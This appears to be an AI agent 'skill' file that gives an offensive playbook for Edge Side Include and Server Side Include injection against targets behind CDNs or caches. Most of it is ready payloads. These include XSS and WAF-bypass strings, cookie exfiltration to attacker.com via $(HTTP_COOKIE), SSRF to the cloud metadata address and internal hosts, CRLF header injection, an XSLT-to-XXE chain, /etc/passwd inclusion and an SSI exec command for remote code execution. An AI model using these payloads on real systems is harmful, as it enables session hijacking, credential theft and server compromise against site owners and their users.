---
name: esi-injection
description: Inject ESI/SSI tags to achieve XSS, cookie theft, SSRF, or WAF bypass via edge/cache layer processing. Use when target has CDN/cache layer (Varnish, Squid, Akamai, Fastly) or serves .shtml files.
---

# ESI & SSI Injection

Edge Side Includes (ESI) and Server Side Includes (SSI) are processed by cache/proxy layers, not the application. If user input reaches ESI/SSI-processed responses, you bypass application-level defenses entirely — the cache layer executes your tags before the app even sees them.

## Detection

**ESI indicators:**
- Response header: `Surrogate-Control: content="ESI/1.0"`
- CDN/cache layer present (Varnish, Squid, Akamai ETS, Fastly, NodeJS esi)

**SSI indicators:**
- File extensions: `.shtml`, `.shtm`, `.stm`
- `<!--#` directives in page source

**Blind detection:**
```html
hell<!--esi-->o
```
If rendered as `hello` (comment stripped, text joined) → ESI is processing.

**OOB detection:**
```html
<esi:include src=http://CALLBACK_URL>
```
Hit on callback = confirmed.

## ESI Software Capabilities

| Software | Includes | Vars | Cookie Access | Upstream Headers | Host Whitelist |
|----------|----------|------|---------------|------------------|----------------|
| Squid3 | Yes | Yes | Yes | Yes | **No** |
| Varnish | Yes | No | No | Yes | Yes |
| Fastly | Yes | No | No | No | Yes |
| Akamai ETS | Yes | Yes | Yes | No | **No** |
| NodeJS esi | Yes | Yes | Yes | No | No |

**Key**: Squid3 and Akamai have no host whitelist — `<esi:include src=http://attacker.com>` works directly. Varnish/Fastly require the included host to be whitelisted.

## XSS via ESI

```html
<esi:include src=http://attacker.com/xss.html>
```

**WAF bypass** — ESI comments break up blocked keywords:
```html
<scr<!--esi-->ipt>aler<!--esi-->t(1)</sc<!--esi-->ript>
<img+src=x+on<!--esi-->error=ale<!--esi-->rt(1)>
```

**Variable-based bypass (Akamai/Squid):**
```html
x=<esi:assign name="v" value="'cript'"/><s<esi:vars name="$(v)"/>>alert(1)</s<esi:vars name="$(v)"/>>
```

## Cookie Theft

**Exfil via include (Squid/Akamai):**
```html
<esi:include src=http://attacker.com/$(HTTP_COOKIE)>
<esi:include src="http://attacker.com/?c=$(HTTP_COOKIE{'JSESSIONID'})"/>
```

**HttpOnly reflection (render cookie in page):**
```html
<!--esi $(HTTP_COOKIE) -->
```

**HttpOnly + XSS combo:**
```html
<!--esi/$url_decode('"><svg/onload=prompt(document.domain)>')/-->
```

## SSRF

```html
<esi:include src="http://169.254.169.254/latest/meta-data/"/>
<esi:include src="http://internal.corp:8080/admin"/>
```

## Header Injection / Open Redirect

```html
<!--esi $add_header('Location','http://attacker.com') -->
```

**CRLF via ESI (CVE-2019-2438):**
```html
<esi:include src="http://example.com/x">
<esi:request_header name="User-Agent" value="12345
Host: evil.com"/>
</esi:include>
```

## ESI + XSLT = XXE Chain

If ESI supports `dca="xslt"`:
```html
<esi:include src="http://attacker.com/data.xml" dca="xslt" stylesheet="http://attacker.com/evil.xsl"/>
```
The XSL payload triggers XXE for file read or further SSRF.

## SSI Payloads

**Info disclosure:**
```html
<!--#echo var="DOCUMENT_NAME" -->
<!--#printenv -->
```

**File inclusion:**
```html
<!--#include virtual="/etc/passwd" -->
```

**RCE:**
```html
<!--#exec cmd="id" -->
```

## Chain With
- xslt-injection (ESI+XSLT→XXE escalation)
- blind-ssrf-chains (ESI include to internal services)
- csp-bypass (ESI-injected scripts bypass app-level CSP)
- web-cache-deception-path (poison cached ESI responses)

## Reference
- https://gosecure.ai/blog/2018/04/03/beyond-xss-edge-side-include-injection/ (GoSecure, ESI injection research)
- https://gosecure.ai/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/ (Implementation-specific abuse)
